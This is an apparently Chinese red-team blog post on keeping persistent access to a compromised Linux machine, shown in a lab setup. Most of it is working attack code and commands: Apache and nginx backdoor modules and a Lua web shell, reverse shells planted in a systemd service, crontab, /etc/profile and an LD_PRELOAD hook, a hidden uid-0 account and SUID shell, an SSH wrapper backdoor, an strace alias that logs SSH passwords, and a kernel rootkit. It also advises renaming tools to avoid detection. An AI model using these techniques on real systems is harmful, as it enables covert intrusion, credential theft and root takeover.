---
title: linux持久化
date: 2022-01-21 15:26:44
categories: 红队技术
tags:
- Linux安全
---

> 无我相，无人相，无众生相，无寿者相。

在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。



<!-- more -->

## 1. Apache 模块后门

> 靶机：172.16.42.151 	hostname:vuln
>
> 攻击机：172.16.42.1 	hostname:ShadowOS

项目地址：https://github.com/VladRico/apache2_BackdoorMod

mod_backdoor is a stealth backdoor using an Apache2 module.
The main idea is to fork() the primary Apache2 process just after it has loaded its config. Since it's forked before the root user transfers the process to www-data, you can execute command as root.
As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this forked root apache2 process, to let us interact as root with the compromised system.



环境搭建

```
[root@vuln ~]# apt install apache2
[root@vuln ~]# git clone https://github.com/VladRico/apache2_BackdoorMod
[root@vuln ~]# cd apache2_BackdoorMod
[root@vuln apache2_BackdoorMod]# cd build
[root@vuln build]# cp backdoor.load /usr/lib/apache2/modules
[root@vuln build]# cp mod_backdoor.so /usr/lib/apache2/modules
[root@vuln build]# cp backdoor.load /etc/apache2/mods-available
[root@vuln build]# a2enmod backdoor
[root@vuln build]# systemctl restart apache2
```

攻击

```
[shadowflow@ShadowOS ~]% curl -H 'Cookie: password=backdoor' http://172.16.42.151/ping
[+] Backdoor module is running !
```

反弹shell

```
[shadowflow@ShadowOS ~]% nc -lvvp 1337
[shadowflow@ShadowOS ~]% curl -H 'Cookie: password=backdoor' http://172.16.42.151/reverse/172.16.42.1/1337/bash
[+] Sending Reverse Shell to 172.16.42.1:1337 using bash
```



修改密码

```
[root@vuln apache2_BackdoorMod]# vim mod_backdoor.c
#define PASSWORD "password=shadowtest"

#重新生成so文件
apt install apache2-dev
apxs -i -a -c mod_backdoor.c sblist.c sblist_delete.c server.c -Wl,-lutil

[shadowflow@ShadowOS ~]% curl -H 'Cookie: password=shadowtest' http://172.16.42.151/ping
[+] Backdoor module is running !
```



### 1.1 手动构造apache module后门

```c
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>

/* The sample content handler */
static int shadowtest_handler(request_rec *r)
{

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    const apr_array_header_t    *fields;
    int                         i;
    apr_table_entry_t           *e = 0;
    char FLAG = 0;
    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;

    for(i = 0; i < fields->nelts; i++) {
        if(strcmp(e[i].key, "Shadowtest") == 0){
            FLAG = 1;
            break;
        }
    }

    if (FLAG){
        char * command = e[i].val;
        FILE* fp = popen(command,"r");
        char buffer[0x100] = {0};
        int counter = 1;
        while(counter){
            counter = fread(buffer, 1, sizeof(buffer), fp);
            ap_rwrite(buffer, counter, r);
        }
        pclose(fp);
        return DONE;
    }
    return DECLINED;
}

static void shadowtest_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(shadowtest_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

/* Dispatch list for API hooks */
module AP_MODULE_DECLARE_DATA shadowtest_module = {
    STANDARD20_MODULE_STUFF,
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    shadowtest_register_hooks  /* register hooks                      */
};
```



```
[root@vuln ~]# apxs -i -a -c mod_shadowtest.c
......
chmod 644 /usr/lib/apache2/modules/mod_shadowtest.so
[preparing module `shadowtest' in /etc/apache2/mods-available/shadowtest.load]
Module shadowtest already enable

[root@vuln ~]# systemctl restart apache2
```

攻击机执行

```
[shadowflow@ShadowOS ~]% curl -H 'Shadowtest: id' 'http://172.16.42.151/x'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## 2. Systemd后门

### 2.1 Systemd服务

Systemd服务基本格式

```
[Unit]   
Description=test   		# 简单描述服务
After=network.target    # 描述服务类别，表示本服务需要在network服务启动后在启动
Before=xxx.service      # 表示需要在某些服务启动之前启动，After和Before字段只涉及启动顺序，不涉及依赖关系。

[Service] 
Type=forking     		# 设置服务的启动方式
User=USER        		# 设置服务运行的用户
Group=USER       		# 设置服务运行的用户组
WorkingDirectory=/PATH	# 设置服务运行的路径(cwd)
KillMode=control-group  # 定义systemd如何停止服务
Restart=no        		# 定义服务进程退出后，systemd的重启方式，默认是不重启
ExecStart=/start.sh    	# 服务启动命令，命令需要绝对路径（采用sh脚本启动其他进程时Type须为forking）
   
[Install]   
WantedBy=multi-user.target  # 多用户
```

完成service脚本编写后，需要执行以下命令以重载生效：

```
# 重新加载所有的systemd服务
systemctl daemon-reload

# 管理服务 [使能开启启动|启动|停止|重启|查看状态]
sudo systemctl [enable|start|stop|restart|status] xxx.service
```

一个服务设置为开机启动使用会将 /usr/lib/systemd/system/name.service 软链接到 /etc/systemd/system/ ，但是 enable 命令不会重写已经存在的链接，所以当我们修改了服务文件就需要重新加载：systemctl reenable name.service



### 2.2 构造System后门

```
[root@vuln systemd]# vim /usr/lib/systemd/system/shadowtest.service
```

```
[Unit]
Description=ShadowTestx

[Service]
ExecStart=/usr/bin/netcat 172.16.42.1 1337 -e /bin/bash
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target
```

```
[root@vuln systemd]# systemctl enable shadowtest
[root@vuln systemd]# systemctl start shadowtest
```



## 3. Nginx后门

### 3.1 nginx模块后门

查看当前nginx服务版本

```
[root@vuln module]# nginx -V
nginx version: nginx/1.14.2
......
```

下载pwnginx

```
git clone https://github.com/t57root/pwnginx.git
```

**修改特征**

- 修改名称防止被检。使用vscode将所有pwnginx替换为了shadownginx

- t57root替换为shadowtest123
- 所有文件名称pwnginx关键字替换

下载对应版本的nginx

```
wget https://nginx.org/download/nginx-1.14.2.tar.gz
```

编译恶意模块的nginx

```
[root@vuln nginx-1.14.2]# ./configure --without-http_rewrite_module --add-module=../shadownginx/module
[root@vuln nginx-1.14.2]# make && make install
```

启动ng

```
[root@vuln nginx-1.14.2]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf
```

pwnginx的客户端我们刚刚已经替换了文本，现在需要重新编译，不能用之前的了，执行make即可编译

```
[root@debian client]# ./shadownginx shell 172.16.42.151 80 shadowtest123
[ shadownginx ] - Pwn nginx
Copyleft by shadowtest123 @ openwill.me
<shadowtest123@gmail.com>  [www.HackShell.net]

Usage:
Get a shell access via the nginx running @ [ip]:[port]
	./shadownginx shell [ip] [port] [password]
Get a socks5 tunnel listening at [socks5ip]:[socks5port]
	./shadownginx socks5 [ip] [port] [password] [socks5ip] [socks5port]

[i] Obtaining shell access
[i] About to connect to nginx


[i] Enjoy the real world.
nx1sh: turning off NDELAY mode
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

修改的相关代码已经上传至github: `https://github.com/ShadowFl0w/shadownginx`



### 3.2 nginx + lua



要求安装有ngx_lua模块，在openresty和tengine中是默认安装了ngx_lua模块的。

参考：https://github.com/netxfly/nginx_lua_security

安装openresty参加官网

**部署后门**

```
[root@vuln ~]# cd /usr/local/openresty/nginx/conf
[root@vuln conf]#
```

在nginx.conf文件的server块中加入如下内容

```
location = /shadowtest {  
    default_type 'text/plain';  
    content_by_lua_file /usr/local/openresty/nginx/conflua/shadowcmd.lua;
}
```

lua脚本

```
[root@vuln conf]# vim /usr/local/openresty/nginx/conf/shadowcmd.lua
```

```
ngx.req.read_body()
local post_args = ngx.req.get_post_args()
local cmd = post_args["cmd"]
if cmd then
    f_ret = io.popen(cmd)
    local ret = f_ret:read("*a")
    ngx.say(string.format("%s", ret))
end
```

启动openresty

```
[root@vuln conf]# /usr/local/openresty/nginx/sbin/nginx  -c /usr/local/openresty/nginx/conf/nginx.conf
```

攻击

```
[shadowflow@ShadowOS ~]% curl 'http://172.16.42.151/shadowtest' -d 'cmd=id'
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```



## 4. 计划任务后门

**crontab反弹python shell**

```
(crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.16.42.150\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -
```



**由于系统的不同，crontrab定时文件位置也会不同：**

- Centos的定时任务文件在`/var/spool/cron/<username>`
- Ubuntu定时任务文件在`/var/spool/cron/crontabs/<username>`



## 5. 环境变量后门

```
echo "bash -i >& /dev/tcp/172.16.42.150/8881 0>&1" >> /etc/profile
```

切换到bash，执行source命令，或者新的终端调用到/etc/profle触发

```
[root@vuln ~]# /bin/bash
root@vuln:~# source /etc/profile
```

同理

```
echo "bash -i >& /dev/tcp/172.15.42.150/8889 0>&1" >> /etc/bashrc
echo "bash -i >& /dev/tcp/172.15.42.150/8889 0>&1" >> /root/.bash_profile
echo "bash -i >& /dev/tcp/172.15.42.150/8889 0>&1" >> /root/.bash_login
echo "bash -i >& /dev/tcp/172.15.42.150/8889 0>&1" >> /root/.profile
echo "bash -i >& /dev/tcp/172.15.42.150/8889 0>&1" >> /root/.inputrc
```





## 6. ld_preload后⻔

详细参考：https://shadowfl0w.github.io/LD-PRELOAD%E5%AD%A6%E4%B9%A0/

当我们得知了一个系统命令所调用的库函数 后，我们可以重写指定的库函数进行劫持。这里我们以 `ls` 命令为例进行演示。

首先查看 `ls` 这一系统命令会调用哪些库函数：

```
readelf -Ws /usr/bin/ls
```

选择的是 strncmp 进行Hook

- hook_strncmp.c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("id");
}

int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
    if (getenv("LD_PRELOAD") == NULL) {
    	return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译

```
gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so
```

执行

```
[root@vuln /tmp]# export LD_PRELOAD=$PWD/hook_strncmp.so
[root@vuln /tmp]# ls
uid=0(root) gid=0(root) 组=0(root)
hook_strcmp.c  hook_strcmp.so  hook_strncmp.c  hook_strncmp.so  passcheck  passcheck.c
[root@vuln /tmp]#
```

利用这种思路，我们可以制作一个隐藏得 Linux 后门，比如当管理员执行 `ls` 命令时会反弹一个 Shell：

- hook_strncmp.c

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/172.16.42.150/4444 0>&1'");
}

int strncmp(const char *__s1, const char *__s2, size_t __n) {    // 这里函数的定义可以根据报错信息进行确定
    if (getenv("LD_PRELOAD") == NULL) {
    	return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译：

```
gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so
```

然后在 `.bashrc` 中写入，我这里用的是zsh，所以写入了.zshrc：

```
export LD_PRELOAD=/tmp/hook_strncmp.so
```

执行ls成功收到了shell

```
[root@debian ~]# nc -lvvp 4444
listening on [any] 4444 ...
172.16.42.151: inverse host lookup failed: Unknown host
connect to [172.16.42.150] from (UNKNOWN) [172.16.42.151] 4124
```

这种方式，会影响系统运行，我在执行vim后就会卡顿。



## 7. ssh公钥免密

将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。

生成公私钥

```
ssh-keygen -t rsa
```

此时进到 ～/.ssh目录可以看到 id_rsa 和 id_rsa.pub 两个文件

```
cd ~/.ssh
ls
```

将上边 本地mac 的 **id_rsa.pub**里边的内容，复制到 服务器上的 **.ssh/authorized_keys** 文件中

```
#客户端执行
scp ~/.ssh/id_rsa.pub root@172.16.42.150:/root/id_rsa.pub
#服务端执行
cat /root/id_rsa.pub >> /root/.ssh/authorized_keys
```

服务器修改权限

```
chmod 700 ~/.ssh 
chmod 600 ~/.ssh/authorized_keys
```

免密登陆

```
ssh root@ip # 默认端口登陆
ssh root@ip -p 端口号 # 指定端口登陆
```



## 8. 创建uid为0的后门账户

交互式创建

```
[root@debian ~]# useradd -o -u 0 shadowtest
[root@debian ~]# passwd shadowtest
新的 密码：
```

非交互式

```
useradd -o -u 0 shadowtest && echo "shad0wtest" | passwd backdoor --stdin
```



删除用户

```
userdel -r -f backdoor
```





## 9. SSH wrapper后门

服务端

```shell
[root@vuln ~]# cd /usr/sbin/
[root@vuln sbin]# mv sshd ../bin/
[root@vuln sbin]# echo '#!/usr/bin/perl' >sshd
[root@vuln sbin]# echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
[root@vuln sbin]# echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
[root@vuln sbin]# chmod u+x sshd
[root@vuln sbin]# systemctl restart sshd
[root@vuln sbin]#
```

客户端

```
[root@debian ~]# socat STDIO TCP4:172.16.42.151:22,sourceport=13377
id
uid=0(root) gid=0(root) 组=0(root)
hostname
vuln

#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。
>>> import struct
>>> buffer = struct.pack('>I6',19526)
>>> print repr(buffer)
'\x00\x00LF'
>>> buffer = struct.pack('>I6',13377)
>>> print buffer
4A
```

**靶机重启，攻击机断开连接后失效**



## 10. ssh 软连接

靶机

```
[root@vuln ~]# ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
[root@vuln ~]#
```

攻击机

```
[root@debian ~]# ssh root@172.16.42.151 -p 5555
root@172.16.42.151's password:
```

**需要输入密码**



## 11. suid shell

在某个用户目录下建立一个隐藏的suid文件.233，之后在每次使用时，以其他普通用户的身份使用-p选项运行此文件，即可获得一个root权限的shell

```
/home/shadowtest/.233 -p
```



靶机：

```
[root@vuln /home]# useradd -d /home/shadowtest -m shadowtest
[root@vuln /home]# passwd shadowtest
新的 密码：
重新输入新的 密码：
passwd：已成功更新密码
[root@vuln /home]# cp /bin/bash /home/shadowtest/.233
[root@vuln /home]# chmod 4755 /home/shadowtest/.233
```

攻击机：

```
[root@debian ~]# ssh shadowtest@172.16.42.151
shadowtest@172.16.42.151's password:
$ whoami
shadowtest
$ /home/shadowtest/.233 -p
.233-5.0# whoami
root
```



## 12 SSH Keylogger（Strace）

注意区别ptrace。

strace是一个可用于诊断、调试和教学的Linux用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。

**第一种方式**

当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。

如果系统没有安装strace服务，先给他安装一个

```
apt install strace
```

在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码

比如当前用户是root

```
cd /root/
vim .bashrc
```

在.bashrc文件的最后一行填上

```
alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh'
```

使bashrc配置生效

```
source .bashrc
```

之后只要用这台机器登录其他机器或者执行su切换用户输入密码都可以被记录到/tmp/.sshpwd***文件

```shell
root@vuln:/tmp# ls -a
.
..
.font-unix
.ICE-unix
.sshpwd-242月021645667067.log
.sshpwd-242月021645667104.log
systemd-private-36c85ff4ad564cf7826c4f24daa1425e-apache2.service-lPYJk8
systemd-private-36c85ff4ad564cf7826c4f24daa1425e-systemd-timesyncd.service-8vJ5jO
.Test-unix
.X11-unix
.XIM-unix
```

查看一下

```bash
root@vuln:/tmp# cat .sshpwd-242月021645667067.log | grep read
......
read(3, "\211Jc\262!Z\224l\267.\270]\207\201`\225\34\303\313\7\277\352C\223\4\377\22\32\227\3618!\324d\275\313-\342t\312q\225\241]", 8192) = 44
read(3, "`8\20b\212\24\206\326\377\323\214\254OtNe\33=\262,\204lc\225\330\325\360>\216&\306\230P\256\n4\351;\357Lo\274\205\10\262\252n9n\264\177E", 8192) = 52
read(4, "r", 1)                         = 1
read(4, "o", 1)                         = 1
read(4, "o", 1)                         = 1
read(4, "t", 1)                         = 1
read(4, "\n", 1)                        = 1
read(3, "\242+\276\234i\340V\254\355\37qz\361eA\263(\223\367\272\307{\223\373+\177\252;", 8192) = 28
....
```

找到密码为root

**第二种方式**

不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。

```
ps -ef | grep sshd    //父进程PID
strace -f -p 523 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048
```

执行了这两条命令后，当有其他机器ssh连接本机器时，无论密码正确还是错误，都会被记录到/tmp/.ssh.log这个日志文件中



## 13. Diamorphine后门

Diamorphine 是一个Linux内核模块， 支持内核版本 2.6.x/3.x/4.x。可通过 uname -r 查看内核版本。

下载

```
git clone https://github.com/m0nad/Diamorphine
```

```
[root@vuln test]# cd Diamorphine
[root@vuln Diamorphine]# make

#加载模块
[root@vuln Diamorphine]# insmod diamorphine.ko

#该模块默认是隐藏的，要想可见执行
[root@vuln Diamorphine]# lsmod | grep -i Diamorphine
[root@vuln Diamorphine]# kill -63 0
[root@vuln Diamorphine]# lsmod | grep -i Diamorphine
diamorphine            16384  0
```

使用

- When loaded, the module starts invisible;
- Hide/unhide any process by sending a signal 31;
- Sending a signal 63(to any pid) makes the module become (in)visible;
- Sending a signal 64(to any pid) makes the given user become root;
- Files or directories starting with the MAGIC_PREFIX become invisible;

提权到root(必须root加载的模块)

```
[root@vuln Diamorphine]# su shadowtest
$ whoami
shadowtest
$ su root
密码：
su: 鉴定故障
$ kill -64 0
$ whoami
root
$ su root
[root@vuln Diamorphine]#
```







## 14. 参考

- https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/
- https://www.cnblogs.com/xiaoxiaosen/p/13359729.html
